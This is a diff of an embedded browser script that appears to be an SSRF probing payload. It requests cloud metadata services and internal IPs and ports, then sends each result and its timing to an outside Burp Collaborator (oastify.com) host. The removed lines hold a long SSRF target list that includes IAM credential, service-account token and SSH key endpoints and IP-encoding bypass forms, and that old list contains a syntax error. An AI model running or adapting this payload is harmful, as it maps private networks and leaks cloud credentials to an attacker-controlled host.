@@ -8,139 +8,27 @@
     <script>
     const collab = 'https://84ad72dbts23ogvbhgx7fmhykpqge97xw.oastify.com';
     
-    // List of internal targets to probe
+    // Simplified target list (add more after confirming it works)
     const targets = [
-        'http://169.254.169.254/latest/meta-data/',          // AWS Metadata
+        'http://169.254.169.254/latest/meta-data/',          // AWS
         'http://169.254.169.254/metadata/instance?api-version=2017-08-01', // Azure
-        'http://metadata.google.internal/computeMetadata/v1/', // GCP (needs header)
+        'http://metadata.google.internal/computeMetadata/v1/', // GCP
         'http://127.0.0.1:80',
-        'http://127.0.0.1:443',
         'http://127.0.0.1:8080',
-        'http://127.0.0.1:8443',
         'http://127.0.0.1:9200',  // Elasticsearch
-        'http://127.0.0.1:5601',  // Kibana
-        'http://127.0.0.1:3000',  // Grafana, Node apps
         'http://10.0.0.1:80',
-        'http://10.0.0.1:8080',
         'http://172.16.0.1:80',
-        'http://172.16.0.1:8080',
-        'http://192.168.1.1:80',
-        'http://192.168.1.1:8080'
-        'http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next',
-'http://[0:0:0:0:0:ffff:169.254.169.254]',
-'http://[0:0:0:0:0:ffff:a9fe:a9fe]',
-'http://0251.00376.000251.0000376',
-'http://0251.0376.0251.0376',
-'http://0251.254.169.254',
-'http://0x41414141A9FEA9FE',
-'http://0xA9.0xFE.0xA9.0xFE',
-'http://0xA9FEA9FE',
-'http://100.100.100.200/latest/meta-data/',
-'http://100.100.100.200/latest/meta-data/image-id',
-'http://100.100.100.200/latest/meta-data/instance-id',
-'http://127.0.0.1:2375/v1.24/containers/json',
-'http://127.0.0.1:2379/v2/keys/?recursive=true',
-'http://127.0.0.1:2379/version',
-'http://169.254.169.254',
-'http://169.254.169.254/2009-04-04/meta-data/',
-    'http://169.254.169.254/computeMetadata/v1/',
-'http://169.254.169.254/hetzner/v1/metadata',
-'http://169.254.169.254/hetzner/v1/metadata/availability-zone',
-'http://169.254.169.254/hetzner/v1/metadata/hostname',
-'http://169.254.169.254/hetzner/v1/metadata/instance-id',
-'http://169.254.169.254/hetzner/v1/metadata/private-networks',
-'http://169.254.169.254/hetzner/v1/metadata/public-ipv4',
-'http://169.254.169.254/hetzner/v1/metadata/region',
-'http://169.254.169.254/latest/api/token',
-'http://169.254.169.254/latest/dynamic/instance-identity/document',
-'http://169.254.169.254/latest/meta-data',
-'http://169.254.169.254/latest/meta-data/',
-'http://169.254.169.254/latest/meta-data/`',
-'http://169.254.169.254/latest/meta-data/ami-id',
-'http://169.254.169.254/latest/meta-data/hostname',
-'http://169.254.169.254/latest/meta-data/iam/security-credentials',
-'http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role',
-'http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE',
-'http://169.254.169.254/latest/meta-data/public-keys/',
-'http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key',
-'http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key',
-'http://169.254.169.254/latest/meta-data/reservation-id',
-'http://169.254.169.254/latest/user-data',
-'http://169.254.169.254/metadata/instance?api-version=2017-04-02',
-'http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text',
-'http://169.254.169.254/metadata/v1/',
-'http://169.254.169.254/metadata/v1/hostname',
-'http://169.254.169.254/metadata/v1/id',
-'http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address',
-'http://169.254.169.254/metadata/v1.json',
-'http://169.254.169.254/metadata/v1/maintenance',
-'http://169.254.169.254/metadata/v1/region',
-'http://169.254.169.254/metadata/v1/user-data',
-'http://169.254.169.254.nip.io/',
-'http://169.254.169.254/openstack',
-'http://169.254.170.2/v2/credentials/',
-'http://192.0.0.192/latest/',
-'http://192.0.0.192/latest/attributes/',
-'http://192.0.0.192/latest/meta-data/',
-'http://192.0.0.192/latest/user-data/',
-'http://2852039166',
-'http://425.510.425.510',
-'http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/`',
-'http://7147006462',
-'http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories)',
-'http://[fd00:ec2::254]',
-'http://[fd00:ec2::254]/latest/meta-data/`',
-'http://[::ffff:a9fe:a9fe]',
-'http://foo/containers/json',
-'http://foo/images/json',
-'http://instance-data',
-'http://localhost:9001/2018-06-01/runtime/invocation/next',
-'http://metadata/computeMetadata/v1/',
-'http://metadata.google.internal/computeMetadata/v1/',
-'http://metadata.google.internal/computeMetadata/v1beta1/',
-'http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json`',
-'http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token`',
-'http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json',
-'http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json`',
-'http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true',
-'http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true',
-'http://metadata.google.internal/computeMetadata/v1/instance/hostname',
-'http://metadata.google.internal/computeMetadata/v1/instance/id',
-'http://metadata.google.internal/computeMetadata/v1/project/project-id',
-'http://nicob.net/redir6a',
-'http://nicob.net/redir-http-169.254.169.254:80-',
-'http://rancher-metadata/',
-'https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/`',
-'https://developers.digitalocean.com/documentation/metadata/`',
-'https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html#runtimes-api-next',
-'https://docs.docker.com/engine/api/latest/',
-'https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option',
-'https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service`',
-'https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance`',
-'https://metadata.packet.net/userdata`',
-'https://notsosecure.com/exploiting-ssrf-aws-elastic-beanstalk)',
-'https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/',
-'https://web.archive.org/web/20180210093624/https://hawkinsecurity.com/2017/12/13/extracting-aws-metadata-via-ssrf-in-google-acquisition/)',
-'https://www.googleapis.com/auth/compute',
-'https://www.googleapis.com/auth/devstorage.read_write',
-'https://www.googleapis.com/auth/logging.write',
-'https://www.googleapis.com/auth/monitoring',
-'https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata',
-'https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA'
-
+        'http://192.168.1.1:80'
     ];
 
     targets.forEach(url => {
         const start = Date.now();
-        // Use no-cors to avoid CORS blocking, and catch errors
         fetch(url, { mode: 'no-cors', cache: 'no-cache' })
             .then(() => {
-                // Connection succeeded (even if we can't read response)
                 const time = Date.now() - start;
                 fetch(collab + '/success?url=' + encodeURIComponent(url) + '&time=' + time);
             })
             .catch(err => {
-                // Connection failed
                 const time = Date.now() - start;
                 fetch(collab + '/fail?url=' + encodeURIComponent(url) + '&time=' + time + '&error=' + encodeURIComponent(err.message));
             });
